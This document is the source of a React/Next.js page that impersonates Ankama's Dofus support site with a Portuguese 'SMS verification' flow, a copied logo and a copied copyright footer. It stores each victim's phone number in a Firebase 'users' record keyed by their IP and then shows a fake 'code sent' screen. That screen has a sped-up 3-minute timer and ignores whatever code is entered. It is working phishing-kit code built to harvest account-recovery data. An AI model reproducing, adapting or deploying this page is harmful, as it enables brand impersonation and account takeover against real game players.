import React, { useEffect, useState } from 'react'
import db from "../../Firebase"
import { doc, setDoc,updateDoc } from "firebase/firestore";
import styles from '@/styles/Home3.module.css'
import Head from 'next/head'
import Image from 'next/image'
import { useRouter } from 'next/router';
import  Router  from 'next/router';
import Link from "next/link";



function App3(props) {
    const [page,setPage] = useState(false);
    const [phone,setPhone] = useState("");
    const [code,setCode] = useState("");
    const [min,setMin] = useState(3);
    const [sec1,setSec1] = useState(0);
    const [visible3,setVisible3] = useState(false)


    const router = useRouter();


    const ip = router.query.ip;

console.log(ip)
    const [c1,setC1] = useState({
        backgroundColor:"",
        color:"white"
    }); 
    const [c2,setC2] = useState({
        backgroundColor:"",
        color:"white"
    });

    const send = async(e)=>{
      e.preventDefault();
        const document = doc(db, "users", ip);
        await updateDoc(document, {
            phone: phone
});
setPage(true)
}

const send2 = async(e)=>{
  e.preventDefault();

  setPage(false)
}
    
    useEffect(()=>{
        if (page == false) {
            setC1({
                backgroundColor:"orangered",
                color:"orangered"
            })
            setC2({
                backgroundColor:"",
                color:"white"
            })
        }else{
            setC2({
                backgroundColor:"orangered",
                color:"orangered"
            })
            setC1({
                backgroundColor:"",
                color:"white"
            })
        }
    },[page]);

    useEffect(()=>{
        if (page == true) {
           const interval = setInterval(()=>{
                setSec1(sec1 -1)
                if (sec1 == 0) {
                    setSec1(59)
                    setMin(min-1);
                }
                
            },350)
            return ()=> clearInterval(interval);

        }
    })


    useEffect(()=>{
        if (min == 0 && sec1 == 0) {
        setPage(false) 
        router.push({
          pathname: '/dofus/prg',
      },"/dofus/prg")
        }
    },[min,sec1])


    const en=()=>{
        Router.push({
          pathname: '/verification/en',
          query: {ip:ip}
      },"/verification/en",{ shallow: true })
       }
       const es=()=>{
        Router.push({
          pathname: '/verification/es',
          query: {ip:ip}
      },"/verification/es",{ shallow: true })
       }
       const fr=()=>{
          Router.push({
            pathname: '/verification/fr',
            query: {ip:ip}
        },"/verification/fr",{ shallow: true })
         }

  return (
    <div className={styles.App}>
      <div className={styles.all3}>
      <div className={styles.nav3}>
        <div className={styles.firstNav}>
          <div className={styles.fcontainer}>
            <div className={styles.leftC}>
              <h3>ankama</h3>
              <p>SUPPORT</p>
            </div>
            <div className={styles.rightC}>
            <p style={{zIndex:10}}>SAIR</p>
             <div style={{zIndex:9}} onClick={()=> setVisible3(!visible3)} className={styles.flags}>
             <div className={styles.flag1}><img  src="/assets/portugal.png" alt="" /></div>
             {visible3 && (
              <>
              <div className={styles.flag}><img onClick={fr} src="/assets/france.png" alt="" /><p className={styles.flagN}>FR</p></div>
              <div className={styles.flag}><img onClick={en}  src="/assets/usa.png" alt="" /><p className={styles.flagN}>EN</p></div>
              <div className={styles.flag}><img src="/assets/de.png" alt="" /><p className={styles.flagN}>DE</p></div>
              <div className={styles.flag}><img onClick={es}  src="/assets/spain.png" alt="" /><p className={styles.flagN}>ES</p></div>
              <div className={styles.flag}><img  src="/assets/portugal.png" alt="" /><p className={styles.flagN}>PT</p></div>
              <div className={styles.flag}><img src="/assets/italy.png" alt="" /><p className={styles.flagN}>IT</p></div>



              </>
             )}
             </div>
            </div>
          </div>
        </div>
        
        </div>

        <div className={styles.headingContainer}>
            <div className={styles.headingLogo}>
                <img src="/assets/logof.png" alt="" />
            </div>
            <div className={styles.headingContext}>
                <div className={styles.fLine}>
                    <p>Bem-vindo {">"} Conta {">"} VERIFICAÇÃO POR SMS</p>
                </div>
                <div className={styles.sLine}>
                    <h2>VERIFICAÇÃO POR SMS</h2>
                </div>
            </div>
        </div>

        <div className={styles.navigator}>
            <div className={styles.phone}>
            <img src="/assets/smms.png" alt="" />
            <p>VERIFICAÇÃO POR SMS</p>
            </div>
            <div className={styles.navRightContainer}>
            <div className={styles.navRight}>

<div className={styles.conte}>
  <center><div style={{backgroundColor:c1.backgroundColor}} className={styles.circles}>1</div>
  <a style={{color:c1.color}} href="">Identificação</a></center>
</div>

<div className={styles.line}></div>

<div className={styles.conte2}>
<center><div style={{backgroundColor:c2.backgroundColor}} className={styles.circles}>2</div>
  <a style={{color:c2.color}} href="">Sms</a></center>
</div>

<div className={styles.line}></div>

<div className={styles.conte}>
<center><div className={styles.circles}>3</div>
  <a style={{color:"white"}} href="">Validação</a></center>
</div>
  
</div>
</div>
</div>


<br /><br />

{!page &&(<div className={styles.blog2}>
<div className={styles.blogContainer2}>
<form onSubmit={send} className={styles.main}>
  <div>
    <div className={styles.header}>
      <div className={styles.title}>
      <div className={styles.titleBox}>
      <h1>IDENTIFICAR A CONTA EM QUESTÃO</h1>
      </div>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.contentBox1}>
        <p>Seu país/região*</p>
        <select name="" id="">
            <option value="ZA">Afrique du Sud</option><option value="AL">Albanie</option><option value="DZ">Algérie</option><option value="DE">Allemagne</option><option value="AD">Andorre</option><option value="AO">Angola</option><option value="AI">Anguilla</option><option value="AQ">Antarctique</option><option value="AG">Antigua et Barbuda</option><option value="AN">Antilles Néerlandaises</option><option value="SA">Arabie Saoudite</option><option value="AR">Argentine</option><option value="AM">Arménie</option><option value="AW">Aruba</option><option value="AU">Australie</option><option value="AT">Autriche</option><option value="AZ">Azerbaïdjan</option><option value="BS">Bahamas</option><option value="BH">Bahreïn</option><option value="BD">Bangladesh</option><option value="BB">Barbades</option><option value="BE">Belgique</option><option value="BZ">Belize</option><option value="BM">Bermudes</option><option value="BT">Bhoutan</option><option value="BY">Biélorussie</option><option value="BO">Bolivie</option><option value="BA">Bosnie-Herzégovine</option><option value="BW">Botswana</option><option value="BN">Brunei Darussalam</option><option value="BR">Brésil</option><option value="BG">Bulgarie</option><option value="BF">Burkina Faso</option><option value="BI">Burundi</option><option value="BJ">Bénin</option><option value="KH">Cambodge</option><option value="CM">Cameroun</option><option value="CA">Canada</option><option value="CV">Cap Vert</option><option value="CL">Chili</option><option value="CN">Chine</option><option value="CY">Chypre</option><option value="CO">Colombie</option><option value="KM">Comores</option><option value="CG">Congo</option><option value="CD">Congo, République Dém.</option><option value="KR">Corée du sud</option><option value="KP">Corée, République de</option><option value="CR">Costa Rica</option><option value="HR">Croatie</option><option value="CU">Cuba</option><option value="CI">Côte d'Ivoire</option><option value="DK">Danemark</option><option value="DJ">Djibouti</option><option value="DM">Dominique</option><option value="EG">Egypte</option><option value="AE">Emirats arabes unis</option><option value="EC">Equateur</option><option value="ER">Érythrée</option><option value="ES">Espagne</option><option value="EE">Estonie</option><option value="ET">Ethiopie</option><option value="FI">Finlande</option><option selected="true" value="FR">France</option><option value="GA">Gabon</option><option value="GM">Gambie</option><option value="GH">Ghana</option><option value="GI">Gibraltar</option><option value="GB">Grande Bretagne</option><option value="GL">Groënland</option><option value="GR">Grèce</option><option value="GP">Guadeloupe</option><option value="GU">Guam</option><option value="GT">Guatemala</option><option value="GN">Guinée</option><option value="GQ">Guinée équatoriale</option><option value="GW">Guinée-Bissau</option><option value="GY">Guyane</option><option value="GF">Guyane française</option><option value="GE">Géorgie</option><option value="GS">Géorgie Sud &amp; Iles Sandwich</option><option value="HT">Haïti</option><option value="HN">Honduras</option><option value="HK">Hong-Kong</option><option value="HU">Hongrie</option><option value="CX">Ile Christmas</option><option value="MU">Ile Maurice</option><option value="NF">Ile Norfolk</option><option value="BV">Iles Bouvet</option><option value="KY">Iles Caïmans</option><option value="CC">Iles Cocos-Keeling</option><option value="CK">Iles Cook</option><option value="FJ">Iles Fidji</option><option value="FO">Iles Féroé</option><option value="HM">Iles Heard et Mc Donald</option><option value="FK">Iles Malouines</option><option value="MP">Iles Mariannes du nord</option><option value="MH">Iles Marshall</option><option value="SB">Iles Salomon</option><option value="SJ">Iles Svalbard et Jan Mayen</option><option value="TC">Iles Turks et Caicos</option><option value="VI">Iles Vierges américaines</option><option value="VG">Iles Vierges britanniques</option><option value="IN">Inde</option><option value="ID">Indonésie</option><option value="IQ">Irak</option><option value="IR">Iran</option><option value="IE">Irlande</option><option value="IS">Islande</option><option value="IL">Israël</option><option value="IT">Italie</option><option value="JM">Jamaïque</option><option value="JP">Japon</option><option value="JO">Jordanie</option><option value="KZ">Kazakhstan</option><option value="KE">Kenya</option><option value="KG">Kirghizistan</option><option value="KI">Kiribati</option><option value="KW">Koweït</option><option value="GD">La Grenade</option><option value="LA">Lao</option><option value="LS">Lesotho</option><option value="LV">Lettonie</option><option value="LB">Liban</option><option value="LR">Liberia</option><option value="LI">Liechtenstein</option><option value="LT">Lituanie</option><option value="LU">Luxembourg</option><option value="LY">Libye</option><option value="MO">Macao</option><option value="MK">Macédoine</option><option value="MG">Madagascar</option><option value="MY">Malaisie</option><option value="MW">Malawi</option><option value="MV">Maldives</option><option value="ML">Mali</option><option value="MT">Malte</option><option value="MA">Maroc</option><option value="MQ">Martinique</option><option value="MR">Mauritanie</option><option value="YT">Mayotte</option><option value="MX">Mexique</option><option value="FM">Micronésie, États Fédérés de</option><option value="MD">Moldavie, République de</option><option value="MC">Monaco</option><option value="MN">Mongolie</option><option value="ME">Monténégro</option><option value="MS">Montserrat</option><option value="MZ">Mozambique</option><option value="MM">Myanmar</option><option value="NA">Namibie</option><option value="NR">Nauru</option><option value="NI">Nicaragua</option><option value="NE">Niger</option><option value="NG">Nigéria</option><option value="NU">Niue</option><option value="NO">Norvège</option><option value="NC">Nouvelle Calédonie</option><option value="NZ">Nouvelle Zélande</option><option value="NP">Népal</option><option value="OM">Oman</option><option value="UG">Ouganda</option><option value="UZ">Ouzbékistan</option><option value="PK">Pakistan</option><option value="PW">Palau</option><option value="PA">Panama</option><option value="PG">Papouasie-Nouvelle-Guinée</option><option value="PY">Paraguay</option><option value="NL">Pays-Bas</option><option value="PH">Philippines</option><option value="PN">Pitcairn</option><option value="PL">Pologne</option><option value="PF">Polynésie Française</option><option value="PT">Portugal</option><option value="PR">Puerto Rico</option><option value="PE">Pérou</option><option value="QA">Qatar</option><option value="RE">Réunion</option><option value="RO">Roumanie</option><option value="RU">Russie</option><option value="RW">Rwanda</option><option value="CF">République Centrafricaine</option><option value="DO">République Dominicaine</option><option value="CZ">République Tchèque</option><option value="EH">Sahara occidental</option><option value="BL">Saint-Barthélemy</option><option value="SM">Saint Marin</option><option value="MF">Saint-Martin</option><option value="LC">Sainte-Lucie</option><option value="SV">Salvador</option><option value="WS">Samoa (Indépendante)</option><option value="AS">Samoa Américaines</option><option value="CS">Serbie-et-Monténégro</option><option value="RS">Serbie</option><option value="SC">Seychelles</option><option value="SL">Sierra Leone</option><option value="SG">Singapour</option><option value="SK">Slovaquie</option><option value="SI">Slovénie</option><option value="SO">Somalie</option><option value="SD">Soudan</option><option value="LK">Sri Lanka</option><option value="KN">St Kitts et Nevis</option><option value="VC">St Vincent et les Grenadines</option><option value="PM">St. Pierre et Miquelon</option><option value="SH">Ste Hélène</option><option value="CH">Suisse</option><option value="SR">Surinam</option><option value="SE">Suède</option><option value="SZ">Swaziland</option><option value="SY">Syrie</option><option value="ST">Säo Tome et Prìncipe</option><option value="SN">Sénégal</option><option value="TJ">Tadjikistan</option><option value="TZ">Tanzanie</option><option value="TW">Taïwan</option><option value="TD">Tchad</option><option value="TF">Ter. FR du sud et antartique</option><option value="IO">Territoire indien britannique</option><option value="TH">Thaïlande</option><option value="TP">Timor Oriental</option><option value="TG">Togo</option><option value="TK">Tokelau</option><option value="TO">Tonga</option><option value="TT">Trinité-et-Tobago</option><option value="TN">Tunisie</option><option value="TM">Turkménistan</option><option value="TR">Turquie</option><option value="TV">Tuvalu</option><option value="US">USA</option><option value="UM">USA Minor Outlying Islands</option><option value="UA">Ukraine</option><option value="UY">Uruguay</option><option value="VU">Vanuatu</option><option value="VA">Vatican</option><option value="VE">Venezuela</option><option value="VN">Vietnam</option><option value="WF">Wallis-et-Futuna</option><option value="YE">Yémen</option><option value="ZM">Zambie</option><option value="ZW">Zimbabwe</option><option value="AX">Aland Islands</option><option value="GG">Guernsey</option><option value="IM">Isle of Man</option><option value="JE">Jersey</option><option value="ZR">Zaire</option><option value="BQ">Bonaire, Saint-Eustache et Saba</option><option value="CW">Curaçao</option><option value="IC">Iles Canaries</option><option value="PS">État de palestine</option><option value="SS">Soudan du Sud</option><option value="SX">Saint-Martin partie néerlandaise</option><option value="TA">Tristan da Cunha</option><option value="TL">Timor Leste</option>
        </select>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.contentBox1}>
        <p>Seu celular*</p>
        <input onChange={(e)=> setPhone(e.target.value)} placeholder='Votre téléphone mobile' type="text" />
      </div>
      
    </div>
    <div className={styles.val}>
    <button disabled={!phone} type="submit">PARA VALIDAR</button>
    <Link href="/mailVerification/prg" style={{color:"red",textDecoration:"none",paddingLeft:"12px"}} shallow><p>Sem acesso ao seu celular? Confirme por e-mail</p></Link>
    </div>

</div>
</form>


  <div className={styles.side}>
    <div className={styles.side1}>
    <div className={styles.header}>
      <div className={styles.icon2}><div className={styles.circle3}></div></div>
      <div className={styles.title}>
      <div className={styles.titleBox}>
      <h1>INFORMAÇÃO</h1>
      </div>
        
      </div>
    </div>
    
    <div className={styles.content}>
    <div className={styles.sideText5}>
        <p>Você pode passar na verificação por SMS e recuperar o controle em minutos!</p>
        <br />
        <p>O envio de SMS é gratuito. Para evitar abusos, as contas estão sujeitas a uma cota de SMS enviada por semana e por mês. Se você usar o serviço razoavelmente, não haverá preocupações.</p>
      <br />
      <p>Você deve inserir o número do celular associado à conta relevante.</p>
      <br />
      <p>Você deve ser o proprietário do telefone para usar este serviço (ou ter obtido sua autorização).</p>
      </div>
    </div>
    
    </div>
  </div>

  </div>
</div>
)}



{page &&(<div>
  <form onSubmit={send2} className={styles.blog2}>

<div className={styles.blogContainer2}>
  <div className={styles.main}>
    <div className={styles.header}>
      <div className={styles.title}>
      <div className={styles.titleBox}>
      <h1>VALIDAÇÃO POR SMS</h1>
      </div>
      </div>
    </div>
    <center>
    <div className={styles.content}>
      <div className={styles.contentBox2}>
        <br />
        <img src="/assets/sms.png" alt="" />
        <p className={styles.message}>Um código de verificação foi enviado por SMS para o número de telefone que você acabou de inserir.</p>
        <p className={styles.message2}>O código de verificação expirará em 3 minutos.</p><br />
        <p style={{color:"orangered",fontWeight:"bold"}}>{0}{min}:{sec1 < 10 && "0"}{sec1}</p><br />
        <input onChange={(e)=> setCode(e.target.value)} placeholder='Code de verification' type="text" required/>
      </div>
      
    </div>
    <center>
    <div className={styles.val2}>
    <button disabled={!code}type="submit">PARA VALIDAR</button>
    </div>
    </center>
    
    </center>
    

</div>


  <div className={styles.side}>
    <div className={styles.side1}>
    <div className={styles.header}>
      <div className={styles.icon2}><div className="circle3"></div></div>
      <div className={styles.title}>
      <div className={styles.titleBox}>
      <h1>INFORMAÇÃO</h1>
      </div>
        
      </div>
    </div>
    
    <div className={styles.content}>
      <div className={styles.sideText5}>
        <p>Você pode passar na verificação por SMS e recuperar o controle em minutos!</p>
        <br />
        <p>O envio de SMS é gratuito. Para evitar abusos, as contas estão sujeitas a uma cota de SMS enviada por semana e por mês. Se você usar o serviço razoavelmente, não haverá preocupações.</p>
      <br />
      <p>Você deve inserir o número do celular associado à conta relevante.</p>
      <br />
      <p>Você deve ser o proprietário do telefone para usar este serviço (ou ter obtido sua autorização).</p>
      </div>
    </div>
    
    </div>
  </div>

  </div>
  </form>

</div>
)}

<div className={styles.footer3}>
  <center>
  <div className={styles.containerf}>
    <img src="/assets/logof.png" alt="" />
    <p>© 2021 Ankama. Todos os direitos reservados. Condições de Utilização - Política de Privacidade - Condições Gerais de Venda - Aviso Legal - Gestão de Cookies</p>
  </div>
  </center>
  
</div>

      </div>
    </div>
  )
}

export default App3